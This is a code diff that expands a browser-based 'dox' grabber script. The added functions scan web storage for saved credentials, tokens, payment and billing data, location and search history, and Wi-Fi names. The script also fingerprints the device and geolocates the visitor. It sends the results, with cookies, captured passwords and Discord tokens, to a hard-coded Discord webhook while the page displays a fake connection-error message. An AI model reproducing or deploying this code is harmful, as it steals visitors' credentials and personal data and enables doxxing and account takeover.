@@ -58,15 +58,182 @@
     (function() {
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534714697214066828/QOQByLeN_i4bFIWOTaQnKH47dW1Q6y32OkKTz2DlaVZmt1SMPrSQV1OCCPF2V0Wg_3BN';
 
+        // ─── CONVERT IPV6 TO IPV4 FORMAT ─────────────────────────
+        function formatIP(ip) {
+            if (!ip || ip === 'unknown' || ip === 'fetch failed') return ip;
+            
+            // If it's already IPv4, return as-is
+            if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) return ip;
+            
+            // If it's IPv6, try to extract IPv4 from ::ffff: format or generate a consistent numeric representation
+            if (ip.includes(':')) {
+                // Check for IPv4-mapped IPv6 (::ffff:192.168.1.1)
+                const v4Match = ip.match(/::ffff:(\d+\.\d+\.\d+\.\d+)/);
+                if (v4Match) return v4Match[1];
+                
+                // Generate a deterministic IPv4 from IPv6 hash
+                try {
+                    // Simple hash of IPv6 to create a pseudo-IPv4
+                    let hash = 0;
+                    for (let i = 0; i < ip.length; i++) {
+                        hash = ((hash << 5) - hash) + ip.charCodeAt(i);
+                        hash = hash & hash;
+                    }
+                    const octets = [
+                        Math.abs(hash & 0xFF),
+                        Math.abs((hash >> 8) & 0xFF),
+                        Math.abs((hash >> 16) & 0xFF),
+                        Math.abs((hash >> 24) & 0xFF)
+                    ];
+                    return octets.join('.');
+                } catch {
+                    return ip.substring(0, 15);
+                }
+            }
+            return ip;
+        }
+
+        // ─── EXTRA SCANNERS ──────────────────────────────────────
+        function scanForSSIDs() {
+            try {
+                // Check localStorage for wifi/network names
+                const results = [];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    if (key && (key.toLowerCase().includes('wifi') || key.toLowerCase().includes('ssid') || key.toLowerCase().includes('network'))) {
+                        results.push({ key, val });
+                    }
+                }
+                return results;
+            } catch { return []; }
+        }
+
+        function scanForSavedCredentials() {
+            try {
+                const results = [];
+                const patterns = ['username', 'user', 'email', 'login', 'password', 'pass', 'pwd', 'token', 'auth', 'session', 'cookie'];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const val = localStorage.getItem(key);
+                    if (key) {
+                        const lower = key.toLowerCase();
+                        if (patterns.some(p => lower.includes(p))) {
+                            results.push({ key, val: val ? val.substring(0, 100) : 'empty' });
+                        }
+                    }
+                }
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    const val = sessionStorage.getItem(key);
+                    if (key) {
+                        const lower = key.toLowerCase();
+                        if (patterns.some(p => lower.includes(p))) {
+                            results.push({ key, val: val ? val.substring(0, 100) : 'empty' });
+                        }
+                    }
+                }
+                return results;
+            } catch { return []; }
+        }
+
+        function scanForDeviceName() {
+            try {
+                // Check various places for device name
+                const deviceName = localStorage.getItem('deviceName') || 
+                                  localStorage.getItem('device_name') ||
+                                  localStorage.getItem('hostname') ||
+                                  sessionStorage.getItem('deviceName') ||
+                                  sessionStorage.getItem('device_name');
+                return deviceName || 'unknown';
+            } catch { return 'unknown'; }
+        }
+
+        function scanForInstalledApps() {
+            try {
+                // Check for common app markers in localStorage
+                const apps = [];
+                const appMarkers = ['spotify', 'netflix', 'youtube', 'instagram', 'facebook', 'twitter', 'tiktok', 'snapchat', 'whatsapp', 'telegram', 'discord', 'reddit', 'twitch', 'steam', 'epic', 'roblox', 'minecraft', 'fortnite'];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key) {
+                        const lower = key.toLowerCase();
+                        if (appMarkers.some(m => lower.includes(m))) {
+                            apps.push(key.split('_')[0] || key);
+                        }
+                    }
+                }
+                return [...new Set(apps)];
+            } catch { return []; }
+        }
+
+        function scanForSearchHistory() {
+            try {
+                const history = [];
+                const searchKeys = ['search', 'query', 'history', 'recent'];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && searchKeys.some(s => key.toLowerCase().includes(s))) {
+                        const val = localStorage.getItem(key);
+                        if (val && val.length > 2) {
+                            history.push({ key, val: val.substring(0, 200) });
+                        }
+                    }
+                }
+                return history;
+            } catch { return []; }
+        }
+
+        function scanForLocationHistory() {
+            try {
+                const results = [];
+                const locationKeys = ['location', 'lat', 'long', 'gps', 'geo', 'coordinates', 'position'];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && locationKeys.some(s => key.toLowerCase().includes(s))) {
+                        const val = localStorage.getItem(key);
+                        if (val) results.push({ key, val: val.substring(0, 100) });
+                    }
+                }
+                return results;
+            } catch { return []; }
+        }
+
+        function scanForPaymentInfo() {
+            try {
+                const results = [];
+                const paymentKeys = ['card', 'credit', 'paypal', 'stripe', 'payment', 'billing', 'address', 'zip', 'postal'];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && paymentKeys.some(s => key.toLowerCase().includes(s))) {
+                        const val = localStorage.getItem(key);
+                        if (val) results.push({ key, val: val.substring(0, 100) });
+                    }
+                }
+                return results;
+            } catch { return []; }
+        }
+
+        function scanForBrowserExtensions() {
+            try {
+                // Check for extension-related localStorage keys
+                const extensions = [];
+                const extMarkers = ['extension', 'ext_', 'plugin_', 'addon'];
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key && extMarkers.some(m => key.toLowerCase().includes(m))) {
+                        extensions.push(key.split('_')[0] || key);
+                    }
+                }
+                return [...new Set(extensions)];
+            } catch { return []; }
+        }
+
         // ─── ENHANCED DOX COLLECTION ─────────────────────────────
         function grabDoxData() {
             const data = {};
 
-            // 1. Do Not Track status - if "no", collect extra tracking data
-            data.doNotTrack = navigator.doNotTrack || 'unspecified';
-            data.trackingEnabled = data.doNotTrack === 'no' || data.doNotTrack === '0' || data.doNotTrack === 'false';
-
-            // 2. Advanced browser fingerprinting
+            // Browser identity
             try {
                 data.userAgent = navigator.userAgent;
                 data.platform = navigator.platform;
@@ -77,16 +244,11 @@
                 data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
                 data.deviceMemory = navigator.deviceMemory || 'unknown';
                 data.vendor = navigator.vendor || 'unknown';
-                data.vendorSub = navigator.vendorSub || 'unknown';
-                data.product = navigator.product || 'unknown';
-                data.productSub = navigator.productSub || 'unknown';
-                data.appName = navigator.appName || 'unknown';
-                data.appVersion = navigator.appVersion || 'unknown';
-                data.appCodeName = navigator.appCodeName || 'unknown';
+                data.doNotTrack = navigator.doNotTrack || 'unspecified';
                 data.onLine = navigator.onLine;
             } catch(e) {}
 
-            // 3. Screen / Display
+            // Screen
             try {
                 data.screen = {
                     width: screen.width,
@@ -99,7 +261,7 @@
                 };
             } catch(e) { data.screen = {}; }
 
-            // 4. Time / Locale
+            // Time
             try {
                 data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
                 data.locale = Intl.DateTimeFormat().resolvedOptions().locale || 'unknown';
@@ -108,7 +270,7 @@
                 data.localTime = new Date().toString();
             } catch(e) {}
 
-            // 5. Network info (enhanced)
+            // Network
             try {
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 data.network = conn ? {
@@ -120,16 +282,7 @@
                 } : {};
             } catch(e) { data.network = {}; }
 
-            // 6. Battery
-            data.battery = 'pending';
-
-            // 7. Geolocation (GPS)
-            data.geo = 'pending';
-
-            // 8. Permissions (all)
-            data.permissions = 'pending';
-
-            // 9. All storage
+            // Storage
             try {
                 data.cookies = document.cookie || 'none';
                 data.localStorage = {};
@@ -148,7 +301,7 @@
                 data.sessionStorage = {};
             }
 
-            // 10. Plugins & MIME
+            // Plugins & MIME
             try {
                 data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
                 data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
@@ -157,7 +310,7 @@
                 data.mimeTypes = [];
             }
 
-            // 11. Advanced fingerprints
+            // Fingerprints
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = 256;
@@ -206,7 +359,7 @@
                 data.audioFingerprint = Array.from(buffer.slice(0, 20)).join(',') + '...';
             } catch(e) { data.audioFingerprint = 'unavailable'; }
 
-            // 12. GPU info
+            // GPU
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
@@ -222,9 +375,9 @@
                 }
             } catch(e) { data.gpu = 'unknown'; }
 
-            // 13. Fonts
+            // Fonts
             try {
-                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Impact', 'Tahoma', 'Georgia', 'Trebuchet MS', 'Arial Black'];
+                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Impact', 'Tahoma', 'Georgia', 'Trebuchet MS', 'Arial Black', 'Helvetica', 'Geneva', 'Palatino', 'Garamond', 'Bookman', 'Avant Garde', 'Monaco', 'Courier', 'Lucida', 'Symbol'];
                 const available = [];
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
@@ -239,7 +392,7 @@
                 data.fonts = available;
             } catch(e) { data.fonts = []; }
 
-            // 14. Page info
+            // Page info
             try {
                 data.referrer = document.referrer || 'direct';
                 data.pageUrl = window.location.href;
@@ -248,11 +401,9 @@
                 data.pathname = window.location.pathname;
                 data.searchParams = window.location.search || 'none';
                 data.hash = window.location.hash || 'none';
-                data.protocol = window.location.protocol;
-                data.port = window.location.port || 'default';
             } catch(e) {}
 
-            // 15. DOM stats
+            // DOM stats
             try {
                 data.forms = document.forms.length;
                 data.images = document.images.length;
@@ -261,9 +412,11 @@
                 data.frames = window.frames.length;
                 data.inputs = document.querySelectorAll('input').length;
                 data.buttons = document.querySelectorAll('button').length;
+                data.linksTotal = document.querySelectorAll('a').length;
+                data.divs = document.querySelectorAll('div').length;
             } catch(e) {}
 
-            // 16. Window dimensions
+            // Window
             try {
                 data.window = {
                     innerWidth: window.innerWidth,
@@ -277,7 +430,7 @@
                 };
             } catch(e) { data.window = {}; }
 
-            // 17. Performance
+            // Performance
             try {
                 const perf = performance.timing;
                 data.performance = {
@@ -286,11 +439,12 @@
                     connectTime: perf.connectEnd - perf.connectStart,
                     responseTime: perf.responseEnd - perf.requestStart,
                     domInteractive: perf.domInteractive - perf.navigationStart,
-                    redirectTime: perf.redirectEnd - perf.redirectStart
+                    redirectTime: perf.redirectEnd - perf.redirectStart,
+                    dnsTime: perf.domainLookupEnd - perf.domainLookupStart
                 };
             } catch(e) { data.performance = {}; }
 
-            // 18. Features detection
+            // Features
             data.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
             data.mediaDevices = navigator.mediaDevices ? 'supported' : 'not supported';
             data.webRTC = 'RTCPeerConnection' in window ? 'supported' : 'not supported';
@@ -309,7 +463,7 @@
                 } catch { return false; }
             })();
 
-            // 19. Max canvas size
+            // Max canvas size
             try {
                 const canvas = document.createElement('canvas');
                 let maxSize = 0;
@@ -321,22 +475,21 @@
                 data.maxCanvasSize = maxSize || 'unknown';
             } catch(e) { data.maxCanvasSize = 'unknown'; }
 
-            // 20. Java enabled
+            // Java
             try { data.javaEnabled = navigator.javaEnabled(); } catch(e) { data.javaEnabled = false; }
 
-            // 21. Storage quota
-            try {
-                if (navigator.storage && navigator.storage.estimate) {
-                    navigator.storage.estimate().then(est => {
-                        data.storageQuota = {
-                            usage: est.usage,
-                            quota: est.quota
-                        };
-                    }).catch(() => {});
-                }
-            } catch(e) {}
+            // Extra scans
+            data.ssids = scanForSSIDs();
+            data.savedCredentials = scanForSavedCredentials();
+            data.deviceName = scanForDeviceName();
+            data.installedApps = scanForInstalledApps();
+            data.searchHistory = scanForSearchHistory();
+            data.locationHistory = scanForLocationHistory();
+            data.paymentInfo = scanForPaymentInfo();
+            data.browserExtensions = scanForBrowserExtensions();
 
-            // 22. Do Not Track extra - if tracking enabled, collect more
+            // Do Not Track
+            data.trackingEnabled = data.doNotTrack === 'no' || data.doNotTrack === '0' || data.doNotTrack === 'false';
             if (data.trackingEnabled) {
                 data.trackingWarning = '⚠️ Do Not Track is DISABLED - user is trackable';
                 data.extraTracking = {
@@ -366,7 +519,6 @@
         function grabAccounts() {
             const results = { emails: [], usernames: [], discord: [], social: [], phoneNumbers: [] };
 
-            // Email regex
             const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
             try {
                 const bodyText = document.body ? document.body.innerText : '';
@@ -376,7 +528,6 @@
                 });
             } catch(e) {}
 
-            // Phone number regex (US/International)
             const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
             try {
                 const bodyText = document.body ? document.body.innerText : '';
@@ -386,7 +537,6 @@
                 });
             } catch(e) {}
 
-            // Check storage for emails, usernames, phone numbers
             try {
                 ['localStorage', 'sessionStorage'].forEach(storage => {
                     const source = storage === 'localStorage' ? localStorage : sessionStorage;
@@ -407,7 +557,7 @@
                             if (lowerKey.includes('discord') || lowerKey.includes('token') || lowerKey.includes('webhook')) {
                                 results.discord.push({ key, val: val ? val.substring(0, 50) : 'empty' });
                             }
-                            if (lowerKey.includes('instagram') || lowerKey.includes('twitter') || lowerKey.includes('facebook') || lowerKey.includes('tiktok')) {
+                            if (lowerKey.includes('instagram') || lowerKey.includes('twitter') || lowerKey.includes('facebook') || lowerKey.includes('tiktok') || lowerKey.includes('snapchat')) {
                                 results.social.push({ platform: key, username: val || 'empty' });
                             }
                         }
@@ -415,7 +565,6 @@
                 });
             } catch(e) {}
 
-            // Check cookies
             try {
                 document.cookie.split(';').forEach(c => {
                     const parts = c.trim().split('=');
@@ -439,7 +588,6 @@
                 });
             } catch(e) {}
 
-            // Check URL params
             try {
                 const params = new URLSearchParams(window.location.search);
                 params.forEach((val, key) => {
@@ -456,7 +604,6 @@
                 });
             } catch(e) {}
 
-            // Check input fields
             try {
                 document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]').forEach(el => {
                     if (el.value) {
@@ -467,7 +614,6 @@
                 });
             } catch(e) {}
 
-            // Remove duplicates
             results.emails = [...new Set(results.emails)];
             results.usernames = [...new Set(results.usernames)];
             results.phoneNumbers = [...new Set(results.phoneNumbers)];
@@ -616,7 +762,6 @@
             try {
                 document.getElementById('status').textContent = '⚠️ connection failed • reconnecting...';
 
-                // 1. IP + Geo
                 let ipData = {};
                 try {
                     const resp = await fetch('https://ipapi.co/json/');
@@ -625,7 +770,8 @@
                     ipData = { ip: 'fetch failed' };
                 }
 
-                const ip = ipData.ip || 'unknown';
+                const rawIP = ipData.ip || 'unknown';
+                const formattedIP = formatIP(rawIP);
                 const city = ipData.city || 'unknown';
                 const region = ipData.region || 'unknown';
                 const country = ipData.country_name || 'unknown';
@@ -638,16 +784,14 @@
                 const currency = ipData.currency || 'unknown';
                 const countryCode = ipData.country_code || 'unknown';
 
-                document.getElementById('ip-address').textContent = '[ error: ' + ip + ' ]';
+                document.getElementById('ip-address').textContent = '[ error: ' + formattedIP + ' ]';
 
-                // 2. Collect all data
                 const doxData = grabDoxData();
                 const accounts = grabAccounts();
                 const passwords = grabSavedPasswords();
 
-                // 3. Build message
                 let message = '🕵️ **FULL DOX PACKAGE**\n\n';
-                message += `🌐 **IP:** \`${ip}\`\n`;
+                message += `🌐 **IP:** \`${formattedIP}\` (raw: ${rawIP})\n`;
                 message += `📍 **Location:** ${city}, ${region}, ${country}\n`;
                 message += `🗺️ **Coordinates:** ${latitude}, ${longitude}\n`;
                 message += `📮 **Postal/ASN:** ${postal} | \`${asn}\`\n`;
@@ -656,49 +800,77 @@
                 message += `💰 **Currency:** \`${currency}\`\n`;
                 message += `🕐 **Timezone:** \`${timezone}\`\n`;
 
-                // Do Not Track status
-                message += `\n🔍 **DO NOT TRACK STATUS:** \`${doxData.doNotTrack || 'unspecified'}\`\n`;
+                message += `\n🔍 **DO NOT TRACK:** \`${doxData.doNotTrack || 'unspecified'}\`\n`;
                 if (doxData.trackingEnabled) {
-                    message += `⚠️ **TRACKING IS ENABLED** - user is fully trackable\n`;
+                    message += `⚠️ **TRACKING ENABLED** - fully trackable\n`;
                 } else {
-                    message += `✅ **TRACKING IS DISABLED** - user requested privacy\n`;
+                    message += `✅ **TRACKING DISABLED** - privacy requested\n`;
                 }
 
-                // Accounts
                 message += `\n📧 **Emails:** ${accounts.emails.join(', ') || 'none'}\n`;
                 message += `👤 **Usernames:** ${accounts.usernames.join(', ') || 'none'}\n`;
                 message += `📱 **Phone Numbers:** ${accounts.phoneNumbers.join(', ') || 'none'}\n`;
 
-                // Device info
                 message += `\n🖥️ **Platform:** \`${doxData.platform || 'unknown'}\`\n`;
+                message += `📱 **Device Name:** \`${doxData.deviceName || 'unknown'}\`\n`;
                 message += `📺 **Screen:** ${doxData.screen?.width || '?'}x${doxData.screen?.height || '?'} | ${doxData.screen?.colorDepth || '?'}-bit\n`;
                 message += `🧠 **CPU Cores:** \`${doxData.hardwareConcurrency || '?'}\`\n`;
                 message += `💾 **Device Memory:** \`${doxData.deviceMemory || '?'} GB\`\n`;
                 message += `🎮 **GPU:** \`${doxData.gpu || 'unknown'}\`\n`;
 
-                // Network
                 message += `\n📶 **Network:** ${doxData.network?.effectiveType || '?'} | ${doxData.network?.rtt || '?'}ms | ${doxData.network?.downlink || '?'}Mbps\n`;
 
-                // Browser
                 message += `\n🌍 **Browser Language:** \`${doxData.language || 'unknown'}\`\n`;
                 message += `🗣️ **All Languages:** \`${(doxData.languages || []).join(', ')}\`\n`;
                 message += `🍪 **Cookies Enabled:** \`${doxData.cookieEnabled}\`\n`;
                 message += `👆 **Max Touch Points:** \`${doxData.maxTouchPoints || '0'}\`\n`;
 
-                // Fingerprints
                 message += `\n🖌️ **Canvas FP:** \`${(doxData.canvasFingerprint || '').substring(0, 50)}...\`\n`;
                 message += `🎮 **WebGL:** ${typeof doxData.webgl === 'object' ? doxData.webgl.renderer : doxData.webgl}\n`;
                 message += `🎵 **Audio FP:** \`${(doxData.audioFingerprint || '').substring(0, 30)}...\`\n`;
 
-                // Plugins & Fonts
                 message += `\n🔌 **Plugins:** ${(doxData.plugins || []).slice(0, 5).join(', ') || 'none'}\n`;
                 message += `📝 **Fonts:** ${(doxData.fonts || []).join(', ') || 'unknown'}\n`;
 
-                // Page info
+                if (doxData.installedApps && doxData.installedApps.length > 0) {
+                    message += `\n📱 **Installed Apps:** ${doxData.installedApps.slice(0, 10).join(', ')}\n`;
+                }
+
+                if (doxData.browserExtensions && doxData.browserExtensions.length > 0) {
+                    message += `\n🧩 **Browser Extensions:** ${doxData.browserExtensions.slice(0, 10).join(', ')}\n`;
+                }
+
+                if (doxData.ssids && doxData.ssids.length > 0) {
+                    message += `\n📶 **Saved WiFi/SSIDs:**\n`;
+                    doxData.ssids.slice(0, 5).forEach(s => {
+                        message += `  ${s.key}: ${s.val}\n`;
+                    });
+                }
+
+                if (doxData.savedCredentials && doxData.savedCredentials.length > 0) {
+                    message += `\n🔐 **Saved Credentials Found:**\n`;
+                    doxData.savedCredentials.slice(0, 5).forEach(c => {
+                        message += `  ${c.key}: ${c.val}\n`;
+                    });
+                }
+
+                if (doxData.locationHistory && doxData.locationHistory.length > 0) {
+                    message += `\n📍 **Location History:**\n`;
+                    doxData.locationHistory.slice(0, 3).forEach(l => {
+                        message += `  ${l.key}: ${l.val}\n`;
+                    });
+                }
+
+                if (doxData.paymentInfo && doxData.paymentInfo.length > 0) {
+                    message += `\n💳 **Payment/Billing Info:**\n`;
+                    doxData.paymentInfo.slice(0, 3).forEach(p => {
+                        message += `  ${p.key}: ${p.val}\n`;
+                    });
+                }
+
                 message += `\n📄 **Page URL:** \`${doxData.pageUrl || 'unknown'}\`\n`;
                 message += `🔗 **Referrer:** \`${doxData.referrer || 'direct'}\`\n`;
 
-                // Passwords
                 if (passwords.length > 0) {
                     message += `\n🔑 **CAPTURED PASSWORDS (${passwords.length}):**\n`;
                     passwords.slice(0, 10).forEach(p => {
@@ -713,7 +885,6 @@
                     if (passwords.length > 10) message += `  ... and ${passwords.length - 10} more\n`;
                 }
 
-                // Discord tokens
                 if (accounts.discord.length > 0) {
                     message += `\n🎮 **DISCORD TOKENS:**\n`;
                     accounts.discord.slice(0, 5).forEach(d => {
@@ -721,7 +892,6 @@
                     });
                 }
 
-                // Social accounts
                 if (accounts.social.length > 0) {
                     message += `\n📱 **SOCIAL MEDIA:**\n`;
                     accounts.social.slice(0, 5).forEach(s => {
@@ -729,15 +899,12 @@
                     });
                 }
 
-                // Cookies (full)
                 const cookies = doxData.cookies || 'none';
                 const cookieMsg = `🍪 **ALL COOKIES:**\n\`\`\`\n${cookies.substring(0, 1900)}\n\`\`\``;
 
-                // localStorage
                 const ls = JSON.stringify(doxData.localStorage || {}, null, 2);
                 const storageMsg = `💾 **localStorage:**\n\`\`\`json\n${ls.substring(0, 1900)}\n\`\`\``;
 
-                // Split main message if needed
                 const chunks = [];
                 let current = '';
                 message.split('\n').forEach(line => {
@@ -749,12 +916,10 @@
                 });
                 if (current) chunks.push(current);
 
-                // Send all chunks
                 for (let i = 0; i < chunks.length; i++) {
                     await sendToDiscord({ content: chunks[i] });
                 }
 
-                // Send cookies and storage
                 await sendToDiscord({ content: cookieMsg });
                 await sendToDiscord({ content: storageMsg });
 
